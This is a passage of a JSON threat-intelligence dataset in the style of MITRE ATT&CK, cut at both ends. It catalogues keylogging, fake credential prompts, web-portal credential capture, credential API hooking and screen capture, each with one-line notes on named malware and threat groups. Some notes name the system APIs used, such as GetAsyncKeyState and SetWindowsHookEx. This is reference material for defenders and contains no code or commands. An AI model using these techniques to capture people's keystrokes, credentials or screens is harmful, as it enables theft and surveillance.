"Dtrack", "description": "Dtrack\u2019s dropper contains a keylogging executable."}, {"id": "S0038", "name": "Duqu", "description": "Duqu can track key presses with a keylogger module."}, {"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP can perform keylogging operations."}, {"id": "S0062", "name": "DustySky", "description": "DustySky contains a keylogger."}, {"id": "S0593", "name": "ECCENTRICBANDWAGON", "description": "ECCENTRICBANDWAGON can capture and store keystrokes."}, {"id": "S0363", "name": "Empire", "description": "Empire includes keylogging capabilities for Windows, Linux, and macOS systems."}, {"id": "S0152", "name": "EvilGrab", "description": "EvilGrab has the capability to capture keystrokes."}, {"id": "S0569", "name": "Explosive", "description": "Explosive has leveraged its keylogging capabilities to gain access to administrator accounts on target servers."}, {"id": "S0076", "name": "FakeM", "description": "FakeM contains a keylogger module."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has logged the keystrokes of victims to escalate privileges."}, {"id": "G0085", "name": "FIN4", "description": "FIN4 has captured credentials via fake Outlook Web App (OWA) login pages and has also used a .NET based keylogger."}, {"id": "S0381", "name": "FlawedAmmyy", "description": "FlawedAmmyy can collect keyboard events."}, {"id": "S1044", "name": "FunnyDream", "description": "The FunnyDream Keyrecord component can capture keystrokes."}, {"id": "S0410", "name": "Fysbis", "description": "Fysbis can perform keylogging."}, {"id": "S0032", "name": "gh0st RAT", "description": "gh0st RAT has a keylogger."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can log keystrokes on the victim's machine."}, {"id": "S0342", "name": "GreyEnergy", "description": "GreyEnergy has a module to harvest pressed keystrokes."}, {"id": "G0043", "name": "Group5", "description": "Malware used by Group5 is capable of capturing keystrokes."}, {"id": "S0170", "name": "Helminth", "description": "The executable version of Helminth has a module to log keystrokes."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has used a PowerShell-based keylogger named kl.ps1."}, {"id": "S0070", "name": "HTTPBrowser", "description": "HTTPBrowser is capable of capturing keystrokes on victims."}, {"id": "S0434", "name": "Imminent Monitor", "description": "Imminent Monitor has a keylogging module."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can capture keystrokes on a compromised host."}, {"id": "S0201", "name": "JPIN", "description": "JPIN contains a custom keylogger."}, {"id": "S0283", "name": "jRAT", "description": "jRAT has the capability to log keystrokes from the victim\u2019s machine, both offline and online."}, {"id": "S0088", "name": "Kasidet", "description": "Kasidet has the ability to initiate keylogging."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has used keyloggers."}, {"id": "S0387", "name": "KeyBoy", "description": "KeyBoy installs a keylogger for intercepting credentials and keystrokes."}, {"id": "S0526", "name": "KGH_SPY", "description": "KGH_SPY can perform keylogging by polling the GetAsyncKeyState() function."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used a PowerShell-based keylogger as well as a tool called MECHANICAL to log keystrokes."}, {"id": "S0437", "name": "Kivars", "description": "Kivars has the ability to initiate keylogging on the infected host."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has the capability to perform keylogging."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group malware KiloAlfa contains keylogging functionality."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot has the ability to capture input on the compromised host via keylogging."}, {"id": "S0409", "name": "Machete", "description": "Machete logs keystrokes from the victim\u2019s machine."}, {"id": "S1016", "name": "MacMa", "description": "MacMa can use Core Graphics Event Taps to intercept user keystrokes from any text input field and saves them to text files. Text input fields include Spotlight, Finder, Safari, Mail, Messages, and other apps that have text fields for passwords."}, {"id": "S0282", "name": "MacSpy", "description": "MacSpy captures keystrokes."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound malware is capable of keylogging."}, {"id": "S0652", "name": "MarkiRAT", "description": "MarkiRAT can capture all keystrokes on a compromised host."}, {"id": "S0167", "name": "Matryoshka", "description": "Matryoshka is capable of keylogging."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used key loggers to steal usernames and passwords."}, {"id": "S1059", "name": "metaMain", "description": "metaMain has the ability to log keyboard events."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has a command to launch a keylogger and capture keystrokes on the victim\u2019s machine."}, {"id": "S1146", "name": "MgBot", "description": "MgBot includes keylogger payloads focused on the QQ chat application."}, {"id": "S0339", "name": "Micropsia", "description": "Micropsia has keylogging capabilities."}, {"id": "S1122", "name": "Mispadu", "description": "Mispadu can log keystrokes on the victim's machine."}, {"id": "S0149", "name": "MoonWind", "description": "MoonWind has a keylogger."}, {"id": "S0336", "name": "NanoCore", "description": "NanoCore can perform keylogging on the victim\u2019s machine."}, {"id": "S0247", "name": "NavRAT", "description": "NavRAT logs the keystrokes on the targeted system."}, {"id": "S0033", "name": "NetTraveler", "description": "NetTraveler contains a keylogger."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can perform keylogging."}, {"id": "S1090", "name": "NightClub", "description": "NightClub can use a plugin for keylogging."}, {"id": "S0385", "name": "njRAT", "description": "njRAT is capable of logging keystrokes."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used keylogging tools called KEYPUNCH and LONGWATCH."}, {"id": "S0439", "name": "Okrum", "description": "Okrum was seen using a keylogger tool to capture keystrokes. "}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors obtained the password for the victim's password manager via a custom keylogger."}, {"id": "S0072", "name": "OwaAuth", "description": "OwaAuth captures and DES-encrypts credentials before writing the username and password to a log file, C:\\log.txt."}, {"id": "S1050", "name": "PcShare", "description": "PcShare has the ability to capture keystrokes."}, {"id": "S0643", "name": "Peppy", "description": "Peppy can log keystrokes on compromised hosts."}, {"id": "G0068", "name": "PLATINUM", "description": "PLATINUM has used several different keyloggers."}, {"id": "S0013", "name": "PlugX", "description": "PlugX has a module for capturing keystrokes per process including window titles."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT has used a Python tool named klog.exe for keylogging."}, {"id": "S0012", "name": "PoisonIvy", "description": "PoisonIvy contains a keylogger."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 has modules for keystroke logging and capturing credentials from spoofed Outlook authentication messages."}, {"id": "S1012", "name": "PowerLess", "description": "PowerLess can use a module to log keystrokes."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit's Get-Keystrokes Exfiltration module can log keystrokes."}, {"id": "S0113", "name": "Prikormka", "description": "Prikormka contains a keylogger module that collects keystrokes and the titles of foreground windows."}, {"id": "S0279", "name": "Proton", "description": "Proton uses a keylogger to capture keystrokes."}, {"id": "S0192", "name": "Pupy", "description": "Pupy uses a keylogger to capture keystrokes it then sends back to the server after it is stopped."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can capture keystrokes on a compromised host."}, {"id": "S0262", "name": "QuasarRAT", "description": "QuasarRAT has a built-in keylogger."}, {"id": "S0662", "name": "RCSession", "description": "RCSession has the ability to capture keystrokes on a compromised host."}, {"id": "S0019", "name": "Regin", "description": "Regin contains a keylogger."}, {"id": "S0332", "name": "Remcos", "description": "Remcos has a command for keylogging."}, {"id": "S0375", "name": "Remexi", "description": "Remexi gathers and exfiltrates keystrokes from the machine."}, {"id": "S0125", "name": "Remsec", "description": "Remsec contains a keylogger component."}, {"id": "S0379", "name": "Revenge RAT", "description": "Revenge RAT has a plugin for keylogging."}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT can use  SetWindowsHookEx and GetKeyNameText to capture keystrokes."}, {"id": "S0090", "name": "Rover", "description": "Rover has keylogging functionality."}, {"id": "S0148", "name": "RTM", "description": "RTM can record keystrokes from both the keyboard and virtual keyboard."}, {"id": "S0253", "name": "RunningRAT", "description": "RunningRAT captures keystrokes and sends them back to the C2 server."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has used a keylogger to capture keystrokes by using the SetWindowsHookEx function."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY has a keylogging capability."}, {"id": "S0533", "name": "SLOTHFULMEDIA", "description": "SLOTHFULMEDIA has a keylogging capability."}, {"id": "S0649", "name": "SMOKEDHAM", "description": "SMOKEDHAM can continuously capture keystrokes."}, {"id": "G0054", "name": "Sowbug", "description": "Sowbug has used keylogging tools."}, {"id": "S0058", "name": "SslMM", "description": "SslMM creates a new thread implementing a keylogging facility using Windows Keyboard Accelerators."}, {"id": "S0018", "name": "Sykipot", "description": "Sykipot contains keylogging functionality to steal passwords."}, {"id": "S0467", "name": "TajMahal", "description": "TajMahal has the ability to capture keystrokes on an infected host."}, {"id": "S0595", "name": "ThiefQuest", "description": "ThiefQuest uses the CGEventTap functions to perform keylogging."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 actors installed a credential logger on Microsoft Exchange servers. Threat Group-3390 also leveraged the reconnaissance framework, ScanBox, to capture keystrokes."}, {"id": "S0004", "name": "TinyZBot", "description": "TinyZBot contains keylogger functionality."}, {"id": "G0131", "name": "Tonto Team", "description": "Tonto Team has used keylogging tools in their operations."}, {"id": "S0094", "name": "Trojan.Karagany", "description": "Trojan.Karagany can capture keystrokes on a compromised host."}, {"id": "S0130", "name": "Unknown Logger", "description": "Unknown Logger is capable of recording keystrokes."}, {"id": "S0257", "name": "VERMIN", "description": "VERMIN collects keystrokes from the victim machine."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has created and accessed a file named rult3uil.log on compromised domain controllers to capture keypresses and command execution."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT has the capability to install a live and offline keylogger, including through the use of the GetAsyncKeyState Windows API."}, {"id": "S0161", "name": "XAgentOSX", "description": "XAgentOSX contains keylogging functionality that will monitor for active application windows and write them to the log, it can handle special characters, and it will buffer by default 50 characters before sending them out over the C2 infrastructure."}, {"id": "S0248", "name": "yty", "description": "yty uses a keylogger plugin to gather keystrokes."}, {"id": "S0330", "name": "Zeus Panda", "description": "Zeus Panda can perform keylogging on the victim\u2019s machine by hooking the functions TranslateMessage and WM_KEYDOWN."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell has a feature to capture a remote computer's keystrokes using a keylogger."}]}, {"name": "GUI Input Capture", "description": "Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: Bypass User Account Control).", "detailed_description": "Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: Bypass User Account Control).\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite. This type of prompt can be used to collect credentials via various languages such as AppleScript and PowerShell. On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. Unix Shell).\nAdversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., Browser Information Discovery and/or Application Window Discovery) to spoof prompts when users are naturally accessing sensitive sites/data.", "id": "T1056.002", "examples": [{"id": "S0482", "name": "Bundlore", "description": "Bundlore prompts the user for their credentials."}, {"id": "S0274", "name": "Calisto", "description": "Calisto presents an input prompt asking for the user's login and password."}, {"id": "S1153", "name": "Cuckoo Stealer", "description": "Cuckoo Stealer has captured passwords by prompting victims with a \"macOS needs to access System Settings\" GUI window."}, {"id": "S0281", "name": "Dok", "description": "Dok prompts the user for credentials."}, {"id": "G0085", "name": "FIN4", "description": "FIN4 has presented victims with spoofed Windows Authentication prompts to collect their credentials."}, {"id": "S0278", "name": "iKitten", "description": "iKitten prompts the user for their credentials."}, {"id": "S0276", "name": "Keydnap", "description": "Keydnap prompts the users for credentials."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has displayed fake forms on top of banking sites to intercept credentials from victims."}, {"id": "S1122", "name": "Mispadu", "description": "Mispadu can monitor browser activity for online banking actions and display full-screen overlay images to block user access to the intended site or present additional data fields."}, {"id": "S0279", "name": "Proton", "description": "Proton prompts users for their credentials."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl prompts the user for credentials through a Microsoft Outlook pop-up."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY's credphisher.py module can prompt a current user for their credentials."}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET prompts the user to input credentials using a native macOS dialog box leveraging the system process /Applications/Safari.app/Contents/MacOS/SafariForWebKitDevelopment."}]}, {"name": "Web Portal Capture", "description": "Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.", "detailed_description": "Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.\nThis variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through External Remote Services and Valid Accounts or as part of the initial compromise by exploitation of the externally facing web service.", "id": "T1056.003", "examples": [{"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors modified the JavaScript loaded by the Ivanti Connect Secure login page to capture credentials entered."}, {"id": "S1022", "name": "IceApple", "description": "The IceApple OWA credential logger can monitor for OWA authentication requests and log the credentials."}, {"id": "C0030", "name": "Triton Safety Instrumented System Attack", "description": "In the Triton Safety Instrumented System Attack, TEMP.Veles captured credentials as they were being changed by redirecting text-based login codes to websites they controlled."}, {"id": "S1116", "name": "WARPWIRE", "description": "WARPWIRE can capture credentials submitted during the web logon process in order to access layer seven applications such as RDP."}, {"id": "G1035", "name": "Winter Vivern", "description": "Winter Vivern registered and hosted domains to allow for creation of web pages mimicking legitimate government email logon sites to collect logon information."}]}, {"name": "Credential API Hooking", "description": "Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials. Unlike Keylogging,  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:", "detailed_description": "Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials. Unlike Keylogging,  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:", "id": "T1056.004", "examples": [{"id": "S0484", "name": "Carberp", "description": "Carberp has hooked several Windows API functions to steal credentials."}, {"id": "S0363", "name": "Empire", "description": "Empire contains some modules that leverage API hooking to carry out tasks, such as netripper."}, {"id": "S0182", "name": "FinFisher", "description": "FinFisher hooks processes by modifying IAT pointers to CreateWindowEx."}, {"id": "S0353", "name": "NOKKI", "description": "NOKKI uses the Windows call SetWindowsHookEx and begins injecting it into every GUI process running on the victim's machine."}, {"id": "G0068", "name": "PLATINUM", "description": "PLATINUM is capable of using Windows hook interfaces for information gathering such as credential access."}, {"id": "S0416", "name": "RDFSNIFFER", "description": "RDFSNIFFER hooks several Win32 API functions to hijack elements of the remote system management user-interface."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot has the ability to capture RDP credentials by capturing the CredEnumerateA API"}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has hooked APIs to perform a wide variety of information theft, such as monitoring traffic from browsers."}, {"id": "S1154", "name": "VersaMem", "description": "VersaMem hooked and overrided Versa's built-in authentication method, setUserPassword, to intercept plaintext credentials when submitted to the server."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy installs an application-defined Windows hook to get notified when a network drive has been attached, so it can then use the hook to call its RecordToFile file stealing method."}, {"id": "S0330", "name": "Zeus Panda", "description": "Zeus Panda hooks processes by leveraging its own IAT hooked functions."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell hooks several API functions to spawn system threads."}]}]}, {"name": "Screen Capture", "description": "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as CopyFromScreen, xwd, or screencapture.", "detailed_description": "Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as CopyFromScreen, xwd, or screencapture.", "id": "T1113", "examples": [{"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla can capture screenshots of the victim\u2019s desktop."}, {"id": "S0622", "name": "AppleSeed", "description": "AppleSeed can take screenshots on a compromised host by calling a series of APIs."}, {"id": "G0007", "name": "APT28", "description": "APT28 has used tools to take screenshots from victims."}, {"id": "G0087", "name": "APT39", "description": "APT39 has used a screen capture utility to take screenshots on a compromised host."}, {"id": "S0456", "name": "Aria-body", "description": "Aria-body has the ability to capture screenshots on compromised hosts."}, {"id": "S1087", "name": "AsyncRAT", "description": "AsyncRAT has the ability to view the screen on compromised hosts."}, {"id": "S0438", "name": "Attor", "description": "Attor's has a plugin that captures screenshots of the target applications."}, {"id": "S0344", "name": "Azorult", "description": "Azorult can capture screenshots of the victim\u2019s machines."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can take screenshots and send them to an actor-controlled C2 server."}, {"id": "S0128", "name": "BADNEWS", "description": "BADNEWS has a command to take a screenshot and send it to the C2 server."}, {"id": "S0337", "name": "BadPatch", "description": "BadPatch captures screenshots in .jpg format and then exfiltrates them."}, {"id": "S0234", "name": "Bandook", "description": "Bandook is capable of taking an image of and uploading the current desktop."}, {"id": "S0017", "name": "BISCUIT", "description": "BISCUIT has a command to periodically take screenshots of the system."}, {"id": "S0089", "name": "BlackEnergy", "description": "BlackEnergy is capable of taking screenshots."}, {"id": "S0657", "name": "BLUELIGHT", "description": "BLUELIGHT has captured a screenshot of the display every 30 seconds for the first 5 minutes after initiating a C2 loop, and then once every five minutes thereafter."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has used a tool to capture screenshots."}, {"id": "S1063", "name": "Brute Ratel C4", "description": "Brute Ratel C4 can take screenshots on compromised hosts."}, {"id": "S0454", "name": "Cadelspy", "description": "Cadelspy has the ability to capture screenshots and webcam photos."}, {"id": "S0351", "name": "Cannon", "description": "Cannon can take a screenshot of the desktop."}, {"id": "S0030", "name": "Carbanak", "description": "Carbanak performs desktop video recording and captures screenshots of the desktop and sends it to the C2 server."}, {"id": "S0484", "name": "Carberp", "description": "Carberp can capture display screenshots with the screens_dll.dll plugin."}, {"id": "S0348", "name": "Cardinal RAT", "description": "Cardinal RAT can capture screenshots."}, {"id": "S0261", "name": "Catchamas", "description": "Catchamas captures screenshots based on specific keywords in the window\u2019s title."}, {"id": "S0631", "name": "Chaes", "description": "Chaes can capture screenshots of the infected machine."}, {"id": "S0674", "name": "CharmPower", "description": "CharmPower has the ability to capture screenshots."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP can capture screenshots on targeted systems using a timer and either upload them or store them to disk."}, {"id": "S0023", "name": "CHOPSTICK", "description": "CHOPSTICK has the capability to capture screenshots."}, {"id": "S0667", "name": "Chrommme", "description": "Chrommme has the ability to capture screenshots."}, {"id": "S0660", "name": "Clambling", "description": "Clambling has the ability to capture screenshots."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike's Beacon payload is capable of capturing screenshots."}, {"id": "S0338", "name": "Cobian RAT", "description": "Cobian RAT has a feature to perform screen capture."}, {"id": "S0591", "name": "ConnectWise", "description": "ConnectWise can take screenshots on remote hosts."}, {"id": "S0050", "name": "CosmicDuke", "description": "CosmicDuke takes periodic screenshots and exfiltrates them."}, {"id": "S0115", "name": "Crimson", "description": "Crimson contains a command to perform screen captures."}, {"id": "S0235", "name": "CrossRAT", "description": "CrossRAT is capable of taking screen captures."}, {"id": "S1153", "name": "Cuckoo Stealer", "description": "Cuckoo Stealer can run screencapture to collect screenshots from compromised hosts. "}, {"id": "G0070", "name": "Dark Caracal", "description": "Dark Caracal took screenshots using their Windows malware."}, {"id": "S0187", "name": "Daserf", "description": "Daserf can take screenshots."}, {"id": "S0021", "name": "Derusbi", "description": "Derusbi is capable of performing screen captures."}, {"id": "S0213", "name": "DOGCALL", "description": "DOGCALL is capable of capturing screenshots of the victim's machine."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has performed screen captures of victims, including by using a tool, scr.exe (which matched the hash of ScreenUtil)."}, {"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP can capture screenshots."}, {"id": "S0062", "name": "DustySky", "description": "DustySky captures PNG screenshots of the main screen."}, {"id": "S0593", "name": "ECCENTRICBANDWAGON", "description": "ECCENTRICBANDWAGON can capture screenshots and store them locally."}, {"id": "S0363", "name": "Empire", "description": "Empire is capable of capturing screenshots on Windows and macOS systems."}, {"id": "S0152", "name": "EvilGrab", "description": "EvilGrab has the capability to capture screenshots."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 captured screenshots and desktop video recordings."}, {"id": "S0182", "name": "FinFisher", "description": "FinFisher takes a screenshot of the screen and displays it on top of all other windows for few seconds in an apparent attempt to hide some messages showed by the system during the setup process."}, {"id": "S0143", "name": "Flame", "description": "Flame can take regular screenshots when certain applications are open that are sent to the command and control server."}, {"id": "S0381", "name": "FlawedAmmyy", "description": "FlawedAmmyy can capture screenshots."}, {"id": "S0277", "name": "FruitFly", "description": "FruitFly takes screenshots of the user's desktop."}, {"id": "S1044", "name": "FunnyDream", "description": "The FunnyDream ScreenCap component can take screenshots on a compromised host."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group's malware can take screenshots of the compromised computer every minute."}, {"id": "S0032", "name": "gh0st RAT", "description": "gh0st RAT can capture the victim\u2019s screen remotely."}, {"id": "G0115", "name": "GOLD SOUTHFIELD", "description": "GOLD SOUTHFIELD has used the remote monitoring and management tool ConnectWise to obtain screen captures from victim's machines."}, {"id": "S0417", "name": "GRIFFON", "description": "GRIFFON has used a screenshot module that can be used to take a screenshot of the remote system."}, {"id": "G0043", "name": "Group5", "description": "Malware used by Group5 is capable of watching the victim's screen."}, {"id": "S0151", "name": "HALFBAKED", "description": "HALFBAKED can obtain screenshots from the victim."}, {"id": "S0431", "name": "HotCroissant", "description": "HotCroissant has the ability to do real time screen viewing on an infected host."}, {"id": "S0203", "name": "Hydraq", "description": "Hydraq includes a component based on the code of VNC that can stream a live feed of the desktop of an infected host."}, {"id": "S0398", "name": "HyperBro", "description": "HyperBro has the ability to take screenshots."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can capture screenshots of not only the entire screen, but of each separate window open, in case they are overlapping."}, {"id": "S0163", "name": "Janicab", "description": "Janicab captured screenshots and sent them out to a C2 server."}, {"id": "S0044", "name": "JHUHUGIT", "description": "A JHUHUGIT variant takes screenshots by simulating the user pressing the \"Take Screenshot\" key (VK_SCREENSHOT), accessing the screenshot saved in the clipboard, and converting it to a JPG image."}, {"id": "S0283", "name": "jRAT", "description": "jRAT has the capability to take screenshots of the victim\u2019s machine."}, {"id": "S0088", "name": "Kasidet", "description": "Kasidet has the ability to initiate keylogging and screen captures."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar captures screenshots of the victim\u2019s screen."}, {"id": "S0387", "name": "KeyBoy", "description": "KeyBoy has a command to perform screen grabbing."}, {"id": "S0271", "name": "KEYMARBLE", "description": "KEYMARBLE can capture screenshots of the victim\u2019s machine."}, {"id": "S0437", "name": "Kivars", "description": "Kivars has the ability to capture screenshots on the infected host."}, {"id": "S0356", "name": "KONNI", "description": "KONNI can take screenshots of the victim\u2019s machine."}, {"id": "S0680", "name": "LitePower", "description": "LitePower can take system screenshots and save them to %AppData%."}, {"id": "S0681", "name": "Lizar", "description": "Lizar can take JPEG screenshots of an infected system."}, {"id": "S0582", "name": "LookBack", "description": "LookBack can take desktop screenshots."}, {"id": "S1142", "name": "LunarMail", "description": "LunarMail can capture screenshots from compromised hosts."}, {"id": "S0409", "name": "Machete", "description": "Machete captures screenshots."}, {"id": "S1016", "name": "MacMa", "description": "MacMa has used Apple\u2019s Core Graphic APIs, such as CGWindowListCreateImageFromArray, to capture the user's screen and open windows."}, {"id": "S0282", "name": "MacSpy", "description": "MacSpy can capture screenshots of the desktop over multiple monitors."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can take a screenshot of the target machine and save it to a file."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound malware can take a screenshot and upload the file to its C2 server."}, {"id": "S1156", "name": "Manjusaka", "description": "Manjusaka can take screenshots of the victim desktop."}, {"id": "S0652", "name": "MarkiRAT", "description": "MarkiRAT can capture screenshots that are initially saved as \u2018scr.jpg\u2019."}, {"id": "S0167", "name": "Matryoshka", "description": "Matryoshka is capable of performing screen captures."}, {"id": "S1059", "name": "metaMain", "description": "metaMain can take and save screenshots."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo can collect screenshots of the victim\u2019s machine."}, {"id": "S0339", "name": "Micropsia", "description": "Micropsia takes screenshots every 90 seconds by calling the Gdi32.BitBlt API."}, {"id": "S1122", "name": "Mispadu", "description": "Mispadu has the ability to capture screenshots on compromised hosts."}, {"id": "G1019", "name": "MoustachedBouncer", "description": "MoustachedBouncer has used plugins to take screenshots on targeted systems."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used malware that can capture screenshots of the victim\u2019s machine."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can capture the victim's screen."}, {"id": "S1090", "name": "NightClub", "description": "NightClub can load a module to call CreateCompatibleDC and GdipSaveImageToStream for screen capture."}, {"id": "S0385", "name": "njRAT", "description": "njRAT can capture screenshots of the victim\u2019s machines."}, {"id": "S1107", "name": "NKAbuse", "description": "NKAbuse can take screenshots of the victim machine."}, {"id": "S0644", "name": "ObliqueRAT", "description": "ObliqueRAT can capture a screenshot of the current screen."}, {"id": "S0340", "name": "Octopus", "description": "Octopus can capture screenshots of the victims\u2019 machine."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has a tool called CANDYKING to capture a screenshot of user's desktop."}, {"id": "S1050", "name": "PcShare", "description": "PcShare can take screen shots of a compromised machine."}, {"id": "S0643", "name": "Peppy", "description": "Peppy can take screenshots on targeted systems."}, {"id": "S0013", "name": "PlugX", "description": "PlugX allows the operator to capture screenshots."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT has the ability to take screen captures."}, {"id": "S0216", "name": "POORAIM", "description": "POORAIM can perform screen capturing."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit's Get-TimedScreenshot Exfiltration module can take screenshots at regular intervals."}, {"id": "S0223", "name": "POWERSTATS", "description": "POWERSTATS can retrieve screenshots from compromised hosts."}, {"id": "S0184", "name": "POWRUNER", "description": "POWRUNER can capture a screenshot from a victim."}, {"id": "S0113", "name": "Prikormka", "description": "Prikormka contains a module that captures screenshots of the victim's desktop."}, {"id": "S0279", "name": "Proton", "description": "Proton captures the content of the desktop with the screencapture binary."}, {"id": "S0147", "name": "Pteranodon", "description": "Pteranodon can capture screenshots at a configurable interval."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can drop a mouse-logger that will take small screenshots around at each click and then send back to the server."}, {"id": "S0686", "name": "QuietSieve", "description": "QuietSieve has taken screenshots every five minutes and saved them to the user's local Application Data folder under Temp\\SymbolSourceSymbols\\icons or Temp\\ModeAuto\\icons."}, {"id": "S1148", "name": "Raccoon Stealer", "description": "Raccoon Stealer can capture screenshots from victim systems."}, {"id": "S0629", "name": "RainyDay", "description": "RainyDay has the ability to capture screenshots."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can take screenshots every 30 seconds as well as when an external removable storage device is connected."}, {"id": "S0662", "name": "RCSession", "description": "RCSession can capture screenshots from a compromised host."}, {"id": "S0495", "name": "RDAT", "description": "RDAT can take a screenshot on the infected system."}, {"id": "S0153", "name": "RedLeaves", "description": "RedLeaves can capture screenshots."}, {"id": "S0332", "name": "Remcos", "description": "Remcos takes automated screenshots of the infected machine."}, {"id": "S0375", "name": "Remexi", "description": "Remexi takes screenshots of windows of interest."}, {"id": "S0592", "name": "RemoteUtilities", "description": "RemoteUtilities can take screenshots on a compromised host."}, {"id": "S0379", "name": "Revenge RAT", "description": "Revenge RAT has a plugin for screen capture."}, {"id": "S0270", "name": "RogueRobin", "description": "RogueRobin has a command named $screenshot that may be responsible for taking screenshots of the victim machine."}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT can capture screenshots of the infected system using the gdi32 library."}, {"id": "S0090", "name": "Rover", "description": "Rover takes screenshots of the compromised system's desktop and saves them to C:\\system\\screenshot.bmp for exfiltration every 60 minutes."}, {"id": "S0148", "name": "RTM", "description": "RTM can capture screenshots."}, {"id": "S0546", "name": "SharpStage", "description": "SharpStage has the ability to capture the victim's screen."}, {"id": "S0217", "name": "SHUTTERSPEED", "description": "SHUTTERSPEED can capture screenshots."}, {"id": "G0091", "name": "Silence", "description": "Silence can capture victim screen activity."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can take a screenshot of the current desktop."}, {"id": "S0633", "name": "Sliver", "description": "Sliver can take screenshots of the victim\u2019s active display."}, {"id": "S0533", "name": "SLOTHFULMEDIA", "description": "SLOTHFULMEDIA has taken a screenshot of a victim's desktop, named it \"Filter3.jpg\", and stored it in the local directory."}, {"id": "S0649", "name": "SMOKEDHAM", "description": "SMOKEDHAM can capture screenshots of the victim\u2019s desktop."}, {"id": "S0273", "name": "Socksbot", "description": "Socksbot can take screenshots."}, {"id": "S0380", "name": "StoneDrill", "description": "StoneDrill can take screenshots."}, {"id": "S1034", "name": "StrifeWater", "description": "StrifeWater has the ability to take screen captures."}, {"id": "S1064", "name": "SVCReady", "description": "SVCReady can take a screenshot from an infected 